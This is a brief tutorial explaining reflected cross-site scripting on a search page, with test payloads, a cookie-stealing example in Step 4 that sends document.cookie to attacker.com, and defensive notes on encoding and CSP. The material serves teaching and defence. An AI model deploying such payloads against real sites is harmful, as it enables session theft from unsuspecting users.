# ⚔️ XSS Attack Analysis

## 🧠 Scenario

A web application reflects user input in a search page:

```
https://example.com/search?q=input
```

---

## 🚀 Step 1: Identify Reflection Point

Check if input appears in response:

```
?q=test
```

If reflected → possible XSS

---

## 🚀 Step 2: Test Basic Payload

```html
<script>alert(1)</script>
```

---

## 🚀 Step 3: Execution

If vulnerable:
- script executes in browser
- confirms XSS

---

## 🧠 Why This Works

Because:
- input is inserted into HTML
- no encoding is applied
- browser treats it as executable script

---

## 🧪 Example

Input:
```
<script>alert('XSS')</script>
```

Output:
- alert popup appears

---

## 🚀 Step 4: Advanced Exploitation

Steal cookies:

```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

---

## 🧠 Attacker Thinking

- Where is input reflected?
- Is it inside HTML, attribute, or script?
- Can I execute JavaScript?
- Can I steal data or session?

---

## ❌ When This Fails

- input is properly encoded
- CSP blocks inline scripts
- HTTPOnly cookies prevent access
- framework auto-sanitizes output

---

## 🛡️ Defensive Insight

Blocking `<script>` alone is not enough.

Real fix:
- output encoding
- CSP
- proper framework usage

---

## 🧾 Key Takeaways

- XSS depends on context (HTML, JS, attribute)
- execution happens in browser
- prevention requires encoding + policies
